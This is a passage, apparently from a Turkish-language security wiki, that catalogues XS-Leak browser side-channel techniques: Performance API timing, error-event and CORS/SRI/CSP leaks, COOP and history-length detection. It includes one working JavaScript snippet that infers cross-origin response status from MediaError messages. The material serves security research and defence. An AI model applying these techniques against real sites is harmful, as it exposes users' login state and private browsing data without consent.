- **Tespit Edilebilir Fark**: Durum Kodu
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Özet:** Hatalarla sonuçlanan istekler birleştirilemez.
- **Kod Örneği**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Bu teknik, bahsedilen belgede bir tabloda bulunmuştur, ancak tekniğin tanımı bulunmamıştır. Ancak, [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak) adresinde kontrol ederek kaynak kodunu bulabilirsiniz.

### Boş Sayfa Sızıntısı

- **Dahil Etme Yöntemleri**: Frames
- **Tespit Edilebilir Fark**: Sayfa İçeriği
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Özet:** Boş yanıtlar kaynak zamanlama girişleri oluşturmaz.
- **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Bir saldırgan, bir isteğin boş bir HTTP yanıt gövdesi ile sonuçlanıp sonuçlanmadığını tespit edebilir çünkü **boş sayfalar bazı tarayıcılarda performans girişi oluşturmaz**.

### **XSS-Auditor Sızıntısı**

- **Dahil Etme Yöntemleri**: Frames
- **Tespit Edilebilir Fark**: Sayfa İçeriği
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Özet:** Güvenlik İddialarında XSS Auditor kullanarak, saldırganlar, oluşturulan yüklerin denetleyicinin filtreleme mekanizmasını tetiklemesi durumunda yanıtların değişimini gözlemleyerek belirli web sayfası öğelerini tespit edebilir.
- **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

Güvenlik İddialarında (SA), Cross-Site Scripting (XSS) saldırılarını önlemek için tasarlanmış olan XSS Auditor, paradoksal olarak hassas bilgileri sızdırmak için istismar edilebilir. Bu yerleşik özellik Google Chrome'dan (GC) kaldırılmış olsa da, SA'da hala mevcuttur. 2013 yılında Braun ve Heiderich, XSS Auditor'un yanlış pozitiflere yol açarak meşru betikleri yanlışlıkla engelleyebileceğini göstermiştir. Bunun üzerine, araştırmacılar, bilgileri çıkarmak ve çapraz kaynaklı sayfalardaki belirli içerikleri tespit etmek için teknikler geliştirmiştir; bu kavram XS-Sızıntılar olarak bilinir ve ilk olarak Terada tarafından rapor edilmiş, Heyes tarafından bir blog yazısında detaylandırılmıştır. Bu teknikler, GC'deki XSS Auditor'a özgü olmasına rağmen, SA'da XSS Auditor tarafından engellenen sayfaların Performans API'sinde giriş oluşturmadığı keşfedilmiştir; bu da hassas bilgilerin hala sızdırılabileceği bir yöntem sunmaktadır.

### X-Frame Sızıntısı

- **Dahil Etme Yöntemleri**: Frames
- **Tespit Edilebilir Fark**: Başlık
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
- **Özet:** X-Frame-Options başlığına sahip kaynak, kaynak zamanlama girişi oluşturmaz.
- **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Eğer bir sayfanın **bir iframe içinde** **render edilmesine izin verilmezse**, bu **performans girişi** oluşturmaz. Sonuç olarak, bir saldırgan **`X-Frame-Options`** yanıt başlığını tespit edebilir.\
Aynı şey bir **embed** **etiketi** kullanıldığında da geçerlidir.

### İndirme Tespiti

- **Dahil Etme Yöntemleri**: Frames
- **Tespit Edilebilir Fark**: Başlık
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Özet:** İndirmeler, Performans API'sinde kaynak zamanlama girişleri oluşturmaz.
- **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Aynı şekilde, içerik dağıtım başlığı nedeniyle **indirilmiş bir kaynak**, **performans girişi** oluşturmaz. Bu teknik, tüm büyük tarayıcılarda çalışır.

### Yönlendirme Başlangıç Sızıntısı

- **Dahil Etme Yöntemleri**: Frames
- **Tespit Edilebilir Fark**: Yönlendirme
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Özet:** Kaynak zamanlama girişi, bir yönlendirmenin başlangıç zamanını sızdırır.
- **Kod Örneği**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Bazı tarayıcıların, çapraz kaynaklı istekler için fazla bilgi kaydetme davranışını istismar eden bir XS-Sızıntı örneği bulduk. Standart, çapraz kaynaklı kaynaklar için sıfıra ayarlanması gereken bir dizi özellik tanımlar. Ancak, **SA**'da, kullanıcıyı hedef sayfa tarafından **yönlendirildiğini** tespit etmek mümkündür; Performans API'sini sorgulayarak ve **redirectStart zamanlama verilerini** kontrol ederek.

### Süre Yönlendirme Sızıntısı

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Yönlendirme
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Özet:** Yönlendirme gerçekleştiğinde zamanlama girişlerinin süresi negatiftir.
- **Kod Örneği**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

GC'de, **yönlendirme** ile sonuçlanan isteklerin **süresi** **negatif** olup, bu nedenle **yönlendirme** ile sonuçlanmayan isteklerden **ayrılabilir**.

### CORP Sızıntısı

- **Dahil Etme Yöntemleri**: Frames
- **Tespit Edilebilir Fark**: Başlık
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Özet:** CORP ile korunan kaynaklar, kaynak zamanlama girişleri oluşturmaz.
- **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Bazı durumlarda, **nextHopProtocol girişi** bir sızıntı tekniği olarak kullanılabilir. GC'de, **CORP başlığı** ayarlandığında, nextHopProtocol **boş** olacaktır. Not edin ki, SA, CORP etkin kaynaklar için hiç performans girişi oluşturmayacaktır.

### Servis Çalışanı

- **Dahil Etme Yöntemleri**: Frames
- **Tespit Edilebilir Fark**: API Kullanımı
- **Daha fazla bilgi**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
- **Özet:** Belirli bir köken için bir servis çalışanın kaydedilip kaydedilmediğini tespit edin.
- **Kod Örneği**:

Servis çalışanları, bir kökende çalışan olay odaklı betik bağlamlarıdır. Bir web sayfasının arka planında çalışır ve kaynakları **yakalamak**, **değiştirmek** ve **önbelleğe almak** için kullanılabilir, böylece çevrimdışı web uygulamaları oluşturur.\
Eğer bir **servis çalışanı** tarafından **önbelleğe alınmış** bir kaynak **iframe** aracılığıyla erişilirse, kaynak **servis çalışanı önbelleğinden** **yüklenir**.\
Kaynağın **servis çalışanı** önbelleğinden **yüklenip yüklenmediğini** tespit etmek için **Performans API'si** kullanılabilir.\
Bu, bir Zamanlama saldırısı ile de yapılabilir (daha fazla bilgi için belgeyi kontrol edin).

### Önbellek

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Zamanlama
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
- **Özet:** Bir kaynağın önbelleğe alınıp alınmadığını kontrol etmek mümkündür.
- **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](<https://xsinator.com/testing.html#Cache%20Leak%20(POST)>)

[Performans API'si](#performance-api) kullanarak bir kaynağın önbelleğe alınıp alınmadığını kontrol etmek mümkündür.

### Ağ Süresi

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Sayfa İçeriği
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
- **Özet:** `performans` API'sinden bir isteğin ağ süresini almak mümkündür.
- **Kod Örneği**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Hata Mesajları Tekniği

### Medya Hatası

- **Dahil Etme Yöntemleri**: HTML Elemanları (Video, Ses)
- **Tespit Edilebilir Fark**: Durum Kodu
- **Daha fazla bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
- **Özet:** Firefox'ta, çapraz kaynaklı bir isteğin durum kodunu doğru bir şekilde sızdırmak mümkündür.
- **Kod Örneği**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false)
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg
}

function startup() {
let audioElement = document.getElementById("audio")
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener(
"click",
function () {
audioElement.src = document.getElementById("testUrl").value
},
false
)
// Create the event handler
var errHandler = function () {
let err = this.error
let message = err.message
let status = ""

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if (
message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1 ||
message.indexOf("Failed to init decoder") != -1
) {
status = "Success"
} else {
status = "Error"
}
displayErrorMessage(
"<strong>Status: " +
status +
"</strong> (Error code:" +
err.code +
" / Error Message: " +
err.message +
")<br>"
)
}
audioElement.onerror = errHandler
}
```
`MediaError` arayüzünün message özelliği, başarılı bir şekilde yüklenen kaynakları benzersiz bir dize ile tanımlar. Bir saldırgan, bu özelliği kullanarak mesaj içeriğini gözlemleyebilir ve böylece bir çapraz kaynak kaynağının yanıt durumunu çıkarabilir.

### CORS Hatası

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Özet:** Güvenlik İddialarında (SA), CORS hata mesajları, yönlendirilmiş isteklerin tam URL'sini istemeden açığa çıkarır.
- **Kod Örneği**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Bu teknik, bir saldırgana **bir çapraz kaynak sitesinin yönlendirmesinin hedefini çıkarmasını** sağlar; çünkü Webkit tabanlı tarayıcıların CORS isteklerini nasıl işlediğini kullanır. Özellikle, bir **CORS etkin isteği**, kullanıcı durumuna dayalı olarak yönlendirme yapan bir hedef siteye gönderildiğinde ve tarayıcı isteği reddettiğinde, **yönlendirmenin hedefinin tam URL'si** hata mesajında açığa çıkar. Bu güvenlik açığı, yönlendirmenin varlığını açığa çıkarmakla kalmaz, aynı zamanda yönlendirmenin uç noktasını ve içerebileceği herhangi bir **hassas sorgu parametresini** de açığa çıkarır.

### SRI Hatası

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Özet:** Güvenlik İddialarında (SA), CORS hata mesajları, yönlendirilmiş isteklerin tam URL'sini istemeden açığa çıkarır.
- **Kod Örneği**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Bir saldırgan, **açık hata mesajlarını** kullanarak çapraz kaynak yanıtlarının boyutunu çıkarabilir. Bu, genellikle CDN'lerden alınan kaynakların değiştirilmediğini doğrulamak için bütünlük niteliğini kullanan Alt Kaynak Bütünlüğü (SRI) mekanizmasından kaynaklanmaktadır. SRI'nin çapraz kaynak kaynaklarında çalışabilmesi için, bunların **CORS etkin** olması gerekir; aksi takdirde bütünlük kontrollerine tabi tutulmazlar. Güvenlik İddialarında (SA), CORS hata XS-Leak gibi, bir bütünlük niteliği ile yapılan bir fetch isteği başarısız olduğunda bir hata mesajı yakalanabilir. Saldırganlar, herhangi bir isteğin bütünlük niteliğine **sahtelik hash değeri** atayarak bu hatayı kasıtlı olarak **tetikleyebilirler**. SA'da, ortaya çıkan hata mesajı, istenen kaynağın içerik uzunluğunu istemeden açığa çıkarır. Bu bilgi sızıntısı, bir saldırgana yanıt boyutundaki değişiklikleri ayırt etme imkanı tanır ve karmaşık XS-Leak saldırılarına zemin hazırlar.

### CSP İhlali/Tespiti

- **Dahil Etme Yöntemleri**: Pop-up'lar
- **Tespit Edilebilir Fark**: Durum Kodu
- **Daha fazla bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
- **Özet:** Eğer yalnızca kurbanın web sitesi CSP'de izin verilirse ve farklı bir alan adına yönlendirmeye çalışırsa, CSP tespit edilebilir bir hata tetikler.
- **Kod Örneği**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Bir XS-Leak, CSP'yi kullanarak bir çapraz kaynak sitenin farklı bir kaynağa yönlendirilip yönlendirilmediğini tespit edebilir. Bu sızıntı, yönlendirmeyi tespit edebilir, ayrıca yönlendirme hedefinin alan adını da açığa çıkarır. Bu saldırının temel fikri, **saldırgan sitesinde hedef alan adını izin vermektir**. Hedef alana bir istek yapıldığında, **çapraz kaynak bir alana yönlendirir**. **CSP**, buna erişimi engeller ve bir **ihlal raporu oluşturur**; bu rapor bir sızıntı tekniği olarak kullanılır. Tarayıcıya bağlı olarak, **bu rapor yönlendirmenin hedef konumunu sızdırabilir**.\
Modern tarayıcılar, yönlendirildiği URL'yi belirtmeyecek, ancak yine de bir çapraz kaynak yönlendirmesinin tetiklendiğini tespit edebilirsiniz.

### Önbellek

- **Dahil Etme Yöntemleri**: Çerçeveler, Pop-up'lar
- **Tespit Edilebilir Fark**: Sayfa İçeriği
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
- **Özet:** Dosyayı önbellekten temizleyin. Hedef sayfayı açar, dosyanın önbellekte mevcut olup olmadığını kontrol eder.
- **Kod Örneği:**

Tarayıcılar, tüm web siteleri için tek bir paylaşılan önbellek kullanabilir. Kaynağın kökenine bakılmaksızın, bir hedef sayfanın **belirli bir dosyayı talep edip etmediğini** çıkarmak mümkündür.

Eğer bir sayfa, yalnızca kullanıcı giriş yaptığında bir resmi yüklüyorsa, **kaynağı geçersiz kılabilir** (artık önbelleğe alınmadıysa, daha fazla bilgi bağlantılarına bakın), **o kaynağı yükleyebilecek bir istek yapabilir** ve kaynağı **kötü bir istekle** yüklemeyi deneyebilirsiniz (örneğin, aşırı uzun bir referans başlığı kullanarak). Eğer kaynak yüklemesi **herhangi bir hata tetiklemediyse**, bunun nedeni **önbelleğe alınmış olmasıdır**.

### CSP Yönergesi

- **Dahil Etme Yöntemleri**: Çerçeveler
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
- **Özet:** CSP başlık yönergeleri, CSP iframe niteliği kullanılarak sorgulanabilir ve politika detaylarını açığa çıkarır.
- **Kod Örneği**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Google Chrome'daki (GC) yeni bir özellik, web sayfalarının bir iframe öğesine bir nitelik ayarlayarak **bir İçerik Güvenlik Politikası (CSP) önermesine** olanak tanır; politika yönergeleri HTTP isteği ile birlikte iletilir. Normalde, gömülü içeriğin **bunu bir HTTP başlığı aracılığıyla yetkilendirmesi** gerekir, aksi takdirde bir **hata sayfası görüntülenir**. Ancak, eğer iframe zaten bir CSP tarafından yönetiliyorsa ve yeni önerilen politika daha kısıtlayıcı değilse, sayfa normal şekilde yüklenir. Bu mekanizma, bir saldırgana, hata sayfasını tanımlayarak bir çapraz kaynak sayfanın **belirli CSP yönergelerini tespit etme** yolu açar. Bu güvenlik açığı kapatılmış olarak işaretlenmiş olsa da, bulgularımız, hata sayfasını tespit edebilen **yeni bir sızıntı tekniği** ortaya koymaktadır; bu, temel sorunun asla tam olarak ele alınmadığını göstermektedir.

### **CORP**

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
- **Özet:** Cross-Origin Resource Policy (CORP) ile güvence altına alınmış kaynaklar, izin verilmeyen bir kökenden alındığında hata verir.
- **Kod Örneği**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORP başlığı, belirli bir kaynağa yönelik no-cors çapraz kaynak isteklerini **engelleyen** nispeten yeni bir web platformu güvenlik özelliğidir. CORP ile korunan bir kaynak, **alındığında hata verir**; bu nedenle başlığın varlığı tespit edilebilir.

### CORB

- **Dahil Etme Yöntemleri**: HTML Elemanları
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
- **Özet**: CORB, saldırganların **istekte `nosniff` başlığının mevcut olup olmadığını** tespit etmelerine olanak tanıyabilir.
- **Kod Örneği**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Saldırı hakkında daha fazla bilgi için bağlantıyı kontrol edin.

### Köken Yansıması Yanlış Yapılandırması Üzerinde CORS Hatası <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
- **Özet:** Eğer Origin başlığı `Access-Control-Allow-Origin` başlığında yansıtılıyorsa, bir kaynağın önbellekte zaten mevcut olup olmadığını kontrol etmek mümkündür.
- **Kod Örneği**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Eğer **Origin başlığı**, `Access-Control-Allow-Origin` başlığında **yansıtılıyorsa**, bir saldırgan bu davranışı kötüye kullanarak **CORS** modunda **kaynağı** **almaya** çalışabilir. Eğer bir **hata** **tetiklenmezse**, bu, kaynağın **web'den doğru bir şekilde alındığı** anlamına gelir; eğer bir hata **tetiklenirse**, bunun nedeni **önbellekten erişilmiş olmasıdır** (hata, önbelleğin orijinal alan adına izin veren bir CORS başlığı ile bir yanıt kaydetmesi nedeniyle ortaya çıkar).\
Eğer köken yansıtılmıyorsa ancak bir joker karakter kullanılıyorsa (`Access-Control-Allow-Origin: *`), bu çalışmayacaktır.

## Okunabilir Nitelikler Tekniği

### Fetch Yönlendirmesi

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Durum Kodu
- **Daha fazla bilgi**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
- **Özet:** GC ve SA, yönlendirme tamamlandıktan sonra yanıtın türünü (opaque-redirect) kontrol etmeye olanak tanır.
- **Kod Örneği**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

`redirect: "manual"` ve diğer parametrelerle Fetch API kullanarak bir istek gönderildiğinde, `response.type` niteliğini okumak mümkündür ve eğer `opaqueredirect` ile eşitse, yanıt bir yönlendirme olmuştur.

### COOP

- **Dahil Etme Yöntemleri**: Pop-up'lar
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
- **Özet:** Cross-Origin Opener Policy (COOP) ile korunan sayfalar, çapraz kaynak etkileşimlerinden erişimi engeller.
- **Kod Örneği**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Bir saldırgan, bir çapraz kaynak HTTP yanıtında Cross-Origin Opener Policy (COOP) başlığının varlığını çıkarabilir. COOP, web uygulamaları tarafından dış sitelerin rastgele pencere referansları elde etmesini engellemek için kullanılır. Bu başlığın görünürlüğü, **`contentWindow` referansına erişmeye çalışarak** tespit edilebilir. COOP koşullu olarak uygulandığında, **`opener` niteliği** belirleyici bir gösterge haline gelir: COOP aktif olduğunda **tanımsızdır**, yokluğunda ise **tanımlıdır**.

### URL Maksimum Uzunluğu - Sunucu Tarafı

- **Dahil Etme Yöntemleri**: Fetch API, HTML Elemanları
- **Tespit Edilebilir Fark**: Durum Kodu / İçerik
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
- **Özet:** Yönlendirme yanıt uzunluğundaki farklılıkları tespit edin, çünkü bu uzunluk sunucunun bir hata ile yanıt vermesine neden olabilir ve bir uyarı oluşturulabilir.
- **Kod Örneği**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Eğer bir sunucu tarafı yönlendirmesi **yönlendirme içinde kullanıcı girdisi** ve **ek veri** kullanıyorsa, bu davranışı tespit etmek mümkündür çünkü genellikle **sunucuların** **istek uzunluğu sınırı** vardır. Eğer **kullanıcı verisi** o **uzunluk - 1** ise, çünkü **yönlendirme** **o veriyi** kullanıyor ve **ek bir şey** ekliyorsa, bu bir **hata tetikler** ve **Hata Olayları** aracılığıyla tespit edilebilir.

Eğer bir şekilde kullanıcılara çerez ayarlayabiliyorsanız, bu saldırıyı **yeterince çerez ayarlayarak** da gerçekleştirebilirsiniz ([**çerez bombası**](../hacking-with-cookies/cookie-bomb.md)) böylece **doğru yanıtın** **artmış boyutu** bir **hata** tetikler. Bu durumda, bu isteği aynı siteden tetiklediğinizde, `<script>` otomatik olarak çerezleri gönderecektir (bu nedenle hataları kontrol edebilirsiniz).\
**Çerez bombası + XS-Search** örneği, bu yazının Beklenen çözümünde bulunabilir: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` veya aynı bağlamda olmak genellikle bu tür bir saldırı için gereklidir.

### URL Maksimum Uzunluğu - İstemci Tarafı

- **Dahil Etme Yöntemleri**: Pop-up'lar
- **Tespit Edilebilir Fark**: Durum Kodu / İçerik
- **Daha fazla bilgi**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
- **Özet:** Yönlendirme yanıt uzunluğundaki farklılıkları tespit edin, çünkü bu uzunluk bir istekte çok büyük olabilir ve bir fark fark edilebilir.
- **Kod Örneği**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

[Chromium belgelerine](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length) göre, Chrome'un maksimum URL uzunluğu 2MB'dır.

> Genel olarak, _web platformu_ URL'lerin uzunluğu üzerinde sınırlara sahip değildir (ancak 2^31 yaygın bir sınırdır). _Chrome_, pratik nedenlerle ve süreçler arası iletişimde hizmet reddi sorunlarını önlemek için URL'leri maksimum **2MB** ile sınırlar.

Bu nedenle, eğer **yönlendirme URL'si bir durumda daha büyükse**, **2MB'dan daha büyük bir URL ile yönlendirme** yapılması mümkündür. Bu gerçekleştiğinde, Chrome **`about:blank#blocked`** sayfasını gösterir.

**Fark edilebilir fark**, eğer **yönlendirme** **tamamlandıysa**, `window.origin` bir **hata** fırlatır çünkü bir çapraz köken bu bilgiyi erişemez. Ancak, eğer **sınır** aşıldıysa ve yüklenen sayfa **`about:blank#blocked`** ise, pencerenin **`origin`** değeri **ebeveynin** değeri olarak kalır, bu da **erişilebilir bir bilgidir.**

**2MB**'ye ulaşmak için gereken tüm ek bilgiler, başlangıç URL'sinde bir **hash** aracılığıyla eklenebilir, böylece **yönlendirmede kullanılacaktır**.

{{#ref}}
url-max-length-client-side.md
{{#endref}}

### Maksimum Yönlendirmeler

- **Dahil Etme Yöntemleri**: Fetch API, Çerçeveler
- **Tespit Edilebilir Fark**: Durum Kodu
- **Daha fazla bilgi**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76)
- **Özet:** Tarayıcının yönlendirme sınırını kullanarak URL yönlendirmelerinin gerçekleşip gerçekleşmediğini belirleyin.
- **Kod Örneği**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Eğer bir tarayıcının **takip edebileceği maksimum** yönlendirme sayısı **20** ise, bir saldırgan **19 yönlendirme** ile kendi sayfasını yüklemeye çalışabilir ve sonunda **kurbanı** test edilen sayfaya gönderebilir. Eğer bir **hata** tetiklenirse, bu durumda sayfa **kurbanı yönlendirmeye** çalışıyordur.

### Geçmiş Uzunluğu

- **Dahil Etme Yöntemleri**: Çerçeveler, Pop-up'lar
- **Tespit Edilebilir Fark**: Yönlendirmeler
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
- **Özet:** JavaScript kodu tarayıcı geçmişini manipüle eder ve uzunluk özelliği ile erişilebilir.
- **Kod Örneği**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

**Geçmiş API'si**, JavaScript kodunun tarayıcı geçmişini manipüle etmesine olanak tanır; bu, **bir kullanıcının ziyaret ettiği sayfaları kaydeder**. Bir saldırgan, uzunluk özelliğini bir dahil etme yöntemi olarak kullanabilir: JavaScript ve HTML navigasyonunu tespit etmek için.\
**`history.length`** kontrol edilerek, bir kullanıcı **bir sayfaya** **geçiş** yaptığında, **aynı kökene geri** döndüğünde ve **`history.length`** değerinin yeni değerini kontrol ettiğinde.

### Aynı URL ile Geçmiş Uzunluğu

- **Dahil Etme Yöntemleri**: Çerçeveler, Pop-up'lar
- **Tespit Edilebilir Fark**: Eğer URL tahmin edilenle aynıysa
- **Özet:** Geçmiş uzunluğunu kötüye kullanarak bir çerçeve/pop-up'ın belirli bir URL'de olup olmadığını tahmin etmek mümkündür.
- **Kod Örneği**: Aşağıda

